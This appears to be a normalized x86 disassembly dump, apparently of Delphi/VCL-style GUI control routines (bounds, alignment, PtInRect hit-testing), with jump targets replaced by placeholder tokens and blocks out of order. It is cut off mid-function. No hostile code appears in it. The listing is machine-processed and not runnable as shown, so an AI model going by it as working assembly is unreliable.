mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_40346c
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_4519cc
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_448200
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44698c
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_44699c
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_44790c
pop esi
retn
sub_448240
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_447940
sub_4482ee
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_446bac
mov cl 0x1
sub_448330
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_446904
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_446904
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_448360
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_448384
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_406bf8
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_40346c
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_44790c
mov [ ebx + 0xc ] eax
sub_448428
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_446858
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_446858
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_4484bc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_4031b8
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_445ef8
mov edx [ esp ]
mov eax esi
call sub_445ed4
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_446180
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_4461c4
sub_448540
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_416eec
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_44627c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_416f3c
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_446124
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4485cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_4484bc
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_44d054
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_448540
pop ecx
jmp r-xdata
sub_44862c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_44871a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448721
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40400c
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_446794
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_446764
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_446764
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_4043f4
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_40403c
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_446684
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_448728
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_40346c
sub_448754
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_448774
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_448794
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4487b4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4487d4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4487f4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_448814
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_420cbc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_445db8
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_40346c
sub_44884c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4488e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418c30
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_4531bc
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_4532f4
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_446764
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_453054
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_453414
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4488ef
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_4488f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_448934
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_4488f8
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_4489e4
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_4033fc
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_448a18
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_448a38
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_40346c
test al al
je r-xdata
mov eax edi
call sub_448a78
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_448aa4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_448ad0
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_406bf8
mov eax esp
call sub_416f64
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_4462a8
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_40346c
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_40346c
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_4462d4
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_416f64
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_416eec
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_44627c
sub_448bf8
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_448c38
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_448d3a
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx [ eax + 0x4 ]
mov [ ebx + 0x4 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
add [ ebx ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
add [ ebx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_403a24
test eax eax
jne r-xdata
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448d41
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_40400c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_403a24
cmp esi eax
je r-xdata
mov edx [ eax + 0x40 ]
add [ ebx ] edx
mov edx [ eax + 0x44 ]
add [ ebx + 0x4 ] edx
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
sub_448d4c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4454a8
mov eax esi
mov edx [ r-xdata ]
call sub_403420
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_448d80
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_448e78
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_445864
push ebx
push sub_44a810
call sub_4218fc
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423f3c
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_4240e4
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_4035bc
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_464e88
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_40403c
lea eax [ ebx + 0x188 ]
call sub_403fe8
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448e7f
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
sub_448e7f
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_448ea4
push ebx
push esi
push edi
call sub_403624
mov ebx edx
mov edi eax
mov eax edi
call sub_420b0c
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_4058a8
mov eax [ edi + 0x178 ]
call sub_403270
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_444410
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_449b44
mov eax edi
call sub_449d84
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_403270
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_449d48
mov esi eax
mov edx esi
mov eax edi
call sub_449bb0
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_449d84
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_44593c
test bl bl
jle r-xdata
call sub_421994
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40360c
sub_448f74
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_449038
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_418748
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403270
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_44d214
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_418550
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_41869c
mov edx esi
mov eax [ ebp - 0xc ]
call sub_418550
test eax eax
je r-xdata
sub_449048
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4498ec
xor eax eax
push ebp
push sub_449088
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_445ba0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44908f
mov eax [ ebp - 0x4 ]
call sub_4498f4
retn
sub_44908f
mov eax [ ebp - 0x4 ]
call sub_448f74
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44a748
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_44790c
sub_4490c4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_4490df ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_449150
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44d358
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_416eec
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
